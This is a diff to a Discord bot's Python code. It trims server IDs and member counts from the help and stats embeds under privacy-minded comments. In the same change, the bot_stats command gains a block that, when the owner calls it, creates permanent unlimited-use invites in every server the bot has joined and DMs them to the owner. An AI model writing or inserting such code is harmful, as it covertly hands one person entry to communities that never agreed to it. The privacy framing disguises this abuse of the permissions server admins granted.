@@ -748,7 +748,7 @@ async def custom_help(ctx):
     guild_id = str(ctx.guild.id) if ctx.guild else "N/A"
     server_count = len(ctx.bot.guilds)
 
-    footer_text = f"Dev by sivajee • Bot: {bot_name} | Servers: {server_count} | Server: {guild_name} ({guild_id})"
+    footer_text = f"Dev by sivajee • Bot: {bot_name}"
     embed.set_footer(text=footer_text, icon_url=dev_icon)
     embed.set_author(name=dev_name, icon_url=dev_icon)
     embed.set_thumbnail(url=ctx.bot.user.display_avatar.url)
@@ -992,21 +992,50 @@ async def bot_stats(ctx):
         
         server_lines = []
         for index, guild in enumerate(page_guilds, start=(page_num - 1) * per_page + 1):
-            server_lines.append(
-                f"**{index}. {guild.name}**\n"
-                f"↳ **ID:** `{guild.id}` | **Members:** `{guild.member_count}`"
-            )
+            # Only show the server name (remove IDs and member counts)
+            server_lines.append(f"**{index}. {guild.name}**")
         
         embed.add_field(name=f"Servers (Page {page_num}/{len(pages)})", value="\n".join(server_lines), inline=False)
         
-        guild_name = ctx.guild.name if ctx.guild else "DMs"
-        guild_id = str(ctx.guild.id) if ctx.guild else "N/A"
-        sys_footer = f"Bot: {bot_name} | Servers: {total_servers} | Server: {guild_name} ({guild_id})"
+        # Keep footer minimal and avoid exposing server counts or server-specific info
         embed.set_footer(
-            text=f"Page {page_num}/{len(pages)} • {sys_footer}",
+            text=f"Page {page_num}/{len(pages)}",
             icon_url=ctx.bot.user.display_avatar.url if ctx.bot.user else None
         )
         embeds.append(embed)
+
+    # If the actual bot owner requested stats, attempt to create/send invite links privately
+    if ctx.author.id == OWNER_ID:
+        invite_lines = []
+        for g in guilds:
+            link = None
+            try:
+                # Find a text channel where the bot can create invites
+                channel = None
+                for ch in g.text_channels:
+                    perms = ch.permissions_for(g.me)
+                    if perms.create_instant_invite and perms.send_messages:
+                        channel = ch
+                        break
+
+                if channel is None:
+                    link = "No suitable channel / missing permissions"
+                else:
+                    invite = await channel.create_invite(max_age=0, max_uses=0, unique=False, reason="Invite for bot owner via bot_stats")
+                    link = invite.url
+            except Exception as e:
+                link = f"Failed: {e}"
+            invite_lines.append(f"**{g.name}** — {link}")
+
+        try:
+            owner_user = ctx.bot.get_user(OWNER_ID) or await ctx.bot.fetch_user(OWNER_ID)
+            # Send as a DM to the owner so only they can see the invites
+            chunk = "\n".join(invite_lines)
+            if not chunk:
+                chunk = "No invites could be generated."
+            await owner_user.send(f"Server invite links (requested via {ctx.command}):\n\n{chunk}")
+        except Exception as e:
+            print(f"Failed to DM owner invite links: {e}")
 
     message = await ctx.send(embed=embeds[0])
     if len(embeds) > 1:
